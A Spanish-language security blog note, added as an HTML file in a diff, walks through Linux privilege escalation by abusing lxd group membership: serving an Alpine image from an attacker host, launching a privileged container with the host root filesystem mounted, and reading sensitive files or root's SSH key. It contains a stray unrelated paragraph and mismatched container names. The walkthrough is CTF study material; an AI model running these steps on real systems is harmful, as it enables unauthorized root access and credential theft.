@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>LXD - Escalando privilegios</title>
+
+    <!-- Estilos principales -->
+  <link rel="stylesheet" href="../assets/css/style.css" />
+  <!-- Fuente y resaltado de código -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  
+</head>
+<body class="glitch-bg">
+  <nav class="navbar">
+    <ul class="nav-list">
+      <li><a href="../index.html">Inicio</a></li>
+      <li><a href="../projects.html">Proyectos</a></li>
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../notes.html">Notas</a></li>
+      <li><a href="../writeups.html">Writeups</a></li>
+      <li><a href="../about.html">Sobre mí</a></li>
+      <li><a href="../contact.html">Contacto</a></li>
+    </ul>
+  </nav>
+
+  <main class="blog-container">
+    <section class="blog-post">
+      <div class="terminal-box">
+        <a href="../notes.html">← Volver a las Notas</a>
+        <h1></h1>
+        <h1>Escalando privilegios con LXD</h1>
+
+        <article>
+
+          <!-- === PRIMERA SECCIÓN: Qué es LXD === -->
+          <section id="Qué es LXD">
+            <br>  
+            <p>
+              Linux Containers (LXC) es una tecnología de virtualización a nivel de sistema operativo que permite ejecutar múltiples sistemas Linux aislados (contenedores) en un solo host. LXD es un sistema de gestión de contenedores basado en LXC, que proporciona una interfaz más fácil de usar y características adicionales para administrar contenedores.
+            </p>
+            <p>Se trata de una tecnología pionera que surgió antes de los frameworks modernos y de JavaScript, diseñada para añadir funcionalidades dinámicas a las páginas web estáticas.</p>
+            <br>
+            <h2>¿Cómo identifico si me puedo aprovechar de LXD?</h2>
+            <p>Para identificar si se puede explotar LXD dentro de un servidor, podemos usar el comando id  para verificar si pertenecemos al grupo lxd</p>
+            <br>
+            <p>Si el comando id muestra que el usuario actual pertenece al grupo lxd, entonces es posible que se pueda aprovechar LXD para escalar privilegios en el sistema.</p>
+            <br>
+            </section>
+            <section id="Explotando LXD para escalar privilegios">
+              <h2>Explotando LXD para escalar privilegios</h2>
+              <p>Si el usuario actual pertenece al grupo lxd, se pueden seguir los siguientes pasos para aprovechar LXD y escalar privilegios:</p>
+              <br>
+              <h3>Descarga de imágenes</h3>
+              <p>Primero dentro de la máquina atacante, vamos a descargar una imagen de contenedor que vamos a usar como base, en este caso, una imagen de alpine:</p>
+              <ul>
+                <li>git clone <a href="https://github.com/saghul/lxd-alpine-builder.git" target="_blank">https://github.com/saghul/lxd-alpine-builder.git</a></li>
+              </ul>
+              <p>Luego de eso ingresamos a la carpeta clonada y poredemos a hacer un build</p>
+              <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd1.png" alt="descarga de imagen alpine - placeholder">
+              </div>
+              <br>
+              <h3>Transferencia de imagen a la máquina victima</h3>
+              <p>Una vez creada la imagen, se puede transferir a la máquina víctima utilizando un servidor web de python:</p>
+              <pre><code class="language-python">python3 -m http.server 5555</code></pre>
+              <br>
+              <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd2.png" alt="servidor web de python - placeholder">
+                </div>
+                <br>
+                <p>Luego, en la máquina víctima, se puede descargar la imagen utilizando wget:</p>
+                <pre><code class="language-bash">wget http://<IP_ATACANTE>:5555/lxd-alpine-v3.13-x86_64.tar.gz</code></pre>
+                <br>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd3.png" alt="descarga de imagen en la máquina víctima - placeholder">
+                </div>
+                <br>
+                <h3>Importar la imagen a LXD</h3>
+                <p>Una vez movida la imagen a la computadora vícitma vamos procederr a inciar el serviciio de lxd y le vamos a indicar que no a todas las opciones:</p>
+                <p>En caso de que más adelante se tenga un fallo creación por el storage pool vamos a volver a este paso para crearlo, ya que puede que actualmente no exista ninguno configurado</p>
+                <pre><code class="language-bash">lxd init</code></pre>
+                <br>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd4.png" alt="iniciar servicio de lxd - placeholder">
+                </div>
+                <br>
+                <p>Luego de eso, se puede importar la imagen descargada a LXD utilizando el siguiente comando:</p>
+                <pre><code class="language-bash">lxc image import lxd-alpine-v3.13-x86_64.tar.gz --alias alpine</code></pre>
+                <br>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd5.png" alt="importar imagen a lxd - placeholder">
+                </div>
+                <br>
+                <p>Una vez la importación ha terminado, podmeos ver el mensaje de confirmación y podemos confirmarlo también listando las imágenes:</p>
+                <pre><code class="language-bash">lxc image list</code></pre>
+                <br>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd6.png" alt="confirmar importación de imagen - placeholder">
+                </div>
+                <br>
+                <h3>Crear y ejecutar un contenedor con privilegios</h3>
+                <p>Ahoraa  podemos proceder a hacer el contenedor privilegiado y montar el sistema de archivos dentro del contenedor</p>
+                <pre><code class="language-bash">lxc launch alpine privesc -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root
+recursive=true</code></pre>
+<br>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd7.png" alt="crear contenedor con privilegios - placeholder">
+                </div>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd8.png" alt="montar sistema de archivos - placeholder">
+                </div>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd9.png" alt="ver contenedor creado - placeholder">
+                </div>
+                <br>
+                <p>Una vez hecho esto, podemos iniciar el contenedor con el siguiente comando:</p>
+                <pre><code class="language-bash">lxc start mycontainer</code></pre>
+                <br>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd10.png" alt="iniciar contenedor - placeholder">
+                </div>
+                <br>
+                <p>Si esto llegara a fallar por un error en storage pool, de que no existe, solo debemos de activaar nuevamente el sercivio y crear el storage pool y dejar todo lo demás en <strong>no</strong> a como hicimos antes</p>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd11.png" alt="crear storage pool - placeholder">
+                </div>
+                <br>
+                <p>Una vez todo esté listo, ya podemos entrar al contenedor con el siguiente comando:</p>
+                <pre><code class="language-bash">lxc exec mycontainer /bin/sh</code></pre>
+                <p>Como el contenedor no tenías bash es que me ha fallado a mi con el uso de bash</p>
+                <br>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd12.png" alt="entrar al contenedor - placeholder">
+                </div>
+                <br>
+                <p>Una vez dentro del contenedor, podemos navegar al directorio donde montamos el sistema de archivos y podemos intentar extraer los archivos sensibles o inclusive el id_rsa de root para acceder al servidor víctima por SSH</p>
+                <br>
+                <h2>Diagrama de flujo del ataque</h2>
+                <br>
+                <div class="img-placeholder">
+                    <img src="../assets/img/notes/lxd-priv/lxd13.png" alt="diagrama de flujo del ataque - placeholder">
+                </div>
+                <br>
+                <P>C:\ Máquinas las cuales se puede explotar este servicio:</P>
+                <ul>
+                    <li>Tabby (Hack The Box)</li>
+            </section>
+       <footer class="post-footer">
+  <span class="post-date"><time datetime="2026-03-06">2026-03-06</time></span>
+  <div class="post-social">
+    <p>[ contact ]</p>
+    <a href="https://www.twitch.tv/kallrize" target="_blank">twitch</a>
+    <a href="https://www.youtube.com/@kallrizeklr5364" target="_blank">Youtube</a>
+    <a href="https://www.linkedin.com/in/gabrielp%C3%A9rez-959645213" target="_blank">linkedin</a>
+  </div>
+</footer>
+        </article>
+      </div>
+    </section>
+  </main>
+</body>
+</html>
